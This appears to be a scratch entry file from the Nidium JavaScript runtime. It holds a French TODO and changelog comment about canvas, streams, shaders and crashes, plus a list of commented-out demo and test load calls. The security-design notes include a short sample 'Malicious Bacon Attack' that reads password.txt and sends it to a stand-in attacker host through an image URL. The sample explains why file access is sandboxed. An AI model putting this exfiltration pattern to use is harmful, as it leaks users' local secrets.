/*
	Today :
		- Callback d'érreur si le fichier ne peux pas être ouvert (404 http, fichier local inexistant, etc..)
		- faire que attachFragmentShader tiennent compte du padding

	CANVAS :
		- donner texture du dessous au shader;

		- canvas.blur(0, 1 ... 4);
		- canvas.toDataURL();
		- canvas.toArrayBuffer();
		- window.canvas.snapshot(x, y, w, h);
		- import des fontes

	- cabler window.devicePixelRatio

	SECURITY DESIGN :
		- créer base de donnée local
		- dedans, créer une clé de config nommée localFileAccess : "/shared/"
		- restraindre API File dans un dossier

		- les appels à File.read("config.bin") --> dist/shared/config.bin
		- Nidium Malicious Bacon Attack :
			var m = File.read("password.txt", function(e){
				var i = new Image();
				t.src = "http://www.hackers.com/content="+URLencode(e.data);
			});

	CRASH :
		- bug des gradients (crash)
		- thread crash
		- showFPS(true) crash au refresh

	STRAIGHTFORWAD
		- outline
		- subtlepatterns.com (contacter et rajouter crédit)


	THREADS AND WORKER
		- Synchronous File API in Thread
		- API Worker + rajouter console+include (voir ça https://github.com/astro/bitford/blob/master/src/sha1-worker.js)


	COMPLEXE
		- scale
		- Gestion du cache
		- NML basics + include
		- nss can not be empty and must have minimum {} in it
		- window.resize

	STEALTH INVISIBLE MODE :
		- 512Mo Ramdisk
		- Cleanup Destruction on quit

------
DONE :
------

	DAY 4:
	- Work with Nico : crash au start sur linux (maybe font / skia)
	- shader ne suit pas le coin haut gauche du layer

	DAY 3:
	- Stream API: getFileSize (distant + locaux)
	- Stream API: seek (distant + locaux)
	- Stream API: Implémenter NativeStream::stop()
	- cabler canvas.attachFragmentShader();
	- cabler canvas.detachFragmentShader();

	DAY 2
	- renommer Native.canvas en window.canvas (main canvas)
	- Stream API WIP

	DAY 1
	- corriger textAlign vertical (center) (DONE)
	- renommer ctx.fontType en ctx.fontFamily (DONE)
	- window.requestAnimationFrame; (DONE)
	- measureText.width (DONE)
	- nml : <viewport>1024x768</viewport> (DONE)
	- nml est maintenant parsé avant le lancement (DONE)

	OLD
	- Image() et File() file relative to nml : (DONE)
	- document.location.href = "fdsf/view.nml"; (DONE)
	- contextmenu window.mouseX, window.mouseY (DONE)
	- radial gradient : fail (DONE)
	- button down rotation : fail (DONE)
	- textAlign vertical (ALMOST DONE)

*/

document.background = "#000000";
//load("sample.js");

//load("applications/_tests/timers.js");
//load("applications/_tests/arc.js");
//load("applications/_tests/canvas.js");
//load("applications/_tests/sockets.client.js");
//load("applications/_tests/sockets.server.js");
//load("applications/_tests/tasks.js");

//load("applications/components/hello.js");
//load("applications/components/motion.js");
//load("applications/components/tabs.js");
//load("applications/components/profiler.js");
//load("applications/components/windows.js");
//load("applications/components/dropdown.js");
//load("applications/components/buttons.js");
//load("applications/components/sliders.js");
//load("applications/components/scrollbars.js");
//load("applications/components/modal.js");
//load("applications/components/threads.js"); // crash
//load("applications/components/tooltips.js");
//load("applications/components/animation.js");
//load("applications/components/flickr.js");
//load("applications/components/http.js");
//load("applications/components/zip.js");

//load("applications/components/text.js"); // FAIL
//load("applications/components/__zzz.js");

/* CANVAS TESTS */

//load("applications/canvas/water.js"); // fail
//load("applications/canvas/sand.js");
//load("applications/canvas/bluewheel.js"); // fail
//load("applications/canvas/cube.js"); // chute de perf VS premières versions 
//load("applications/canvas/cubewall.js"); // RAS
//load("applications/canvas/flamme.js"); // OK
//load("applications/canvas/particles.js"); // slow
//load("applications/canvas/text.js"); // OK
//load("applications/canvas/shader.js"); // OK

//load("applications/components/flickr.js");


/* UNIT TESTS */

	//load("applications/_tests/arc.js");
	//load("testArc.js");
	//load("testRetina.js");


/* MEDIA API */

	//load("applications/audio/test.js"); // CRASH au refresh + BRUIT DE BETE
	//load("applications/audio/mixer.js"); // FAIL TOTAL + BRUIT DE BETE
	//load("applications/audio/dsp.js"); // crash
	//load("applications/media/video.js"); // crash on refresh (and video end)

/* FILE API */

	//load("applications/components/file.basic.js");
	//load("applications/components/file.advanced.js");


/* SHADERS */

	//load("applications/components/shader.js"); // OK
	//load("applications/components/shader.basic.js"); // TODO : relative path to app
	load("applications/components/shader.advanced.js"); // TODO : relative path to app

/* TUTORIALS */

	//load("applications/tutorials/01.hello.js");
	//load("applications/tutorials/02.buttons.js");
	//load("applications/tutorials/03.events.js");
	//load("applications/tutorials/04.motion.js");
	//load("applications/tutorials/11.post.js");

/* CHARTS DEMOS */

	//load("applications/charts/line.js");
	//load("applications/charts/pie.js");
	//load("applications/charts/polar.js"); // implement vertical text align
	//load("applications/charts/donut.js");
	//load("applications/charts/radar.js");
	//load("applications/charts/bar.js");
	//load("applications/charts/demo.js");

/* Unfinished */

	//load("applications/components/splines.js"); // LENTEUR ABOMINABLE
	//load("applications/components/diagrams.js");



/* -- Native Debugger ------------------ */

//load("applications/NatBug.nap");
